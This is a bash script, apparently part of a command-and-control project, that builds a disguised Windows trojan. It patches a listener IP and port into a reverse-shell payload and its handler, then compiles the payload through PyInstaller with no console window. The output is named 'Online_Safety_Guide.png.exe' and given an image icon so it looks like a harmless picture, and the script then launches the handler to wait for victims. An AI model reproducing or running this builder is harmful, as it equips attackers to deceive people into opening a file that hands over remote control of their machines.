#!/bin/bash

# !!! RUN THE SCRIPT AS ROOT !!!

handler=Scripts/server.py
rev_sh=Scripts/reverse_shell.py

read -p "Enter the IP address of the Listening machine (if not provided, first identified IP of the machine will be taken) : " listen_ip

if [ -z "$listen_ip" ]
then
	IP_List=$(hostname -I)
	End=`expr index "$IP_List" " "`
	listen_ip=${IP_List:0:End-1}
	echo "No IP address provided. Using identified system IP "$listen_ip
else
	echo "Using IP "$listen_ip
fi



read -p "Enter the Port # to listen on (default is 54321): " listen_port

# if user has not entered a port to listen, default port 54321 will be used
if [ -z "$listen_port" ]
then
	listen_port=54321
	echo "No port provided. Using default port "$listen_port" as Listening Port"
else
	echo "Using Port "$listen_port
fi



sed -i 's/attack_ip = .*/attack_ip = '\"$listen_ip\"'/' $handler
sed -i 's/connect_ip = .*/connect_ip = '\"$listen_ip\"'/' $rev_sh

sed -i 's/listen_port = .*/listen_port = '$listen_port'/' $handler
sed -i 's/conn_port = .*/conn_port = '$listen_port'/' $rev_sh



wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/home/voldemort/Desktop/pythonScripts/C&CC/Res/Online_Safety_Guide.png;." --onefile --noconsole --icon /home/voldemort/Desktop/pythonScripts/C\&CC/Res/Icons/img.ico -n Online_Safety_Guide.png Scripts/reverse_shell.py

cp dist/Online_Safety_Guide.png.exe Online_Safety_Guide.png.exe
rm -r dist/ build/ Online_Safety_Guide.png.spec
echo "[+] Generated payload saved at : "$(pwd)

read -p "Press Y when you're ready to launch the handler..." resp
if [ $resp == 'y' ] || [ $resp == 'Y' ]
then
	clear
	sudo -u $(users) python $handler
else
	echo "Exiting the program."
	exit 1
fi
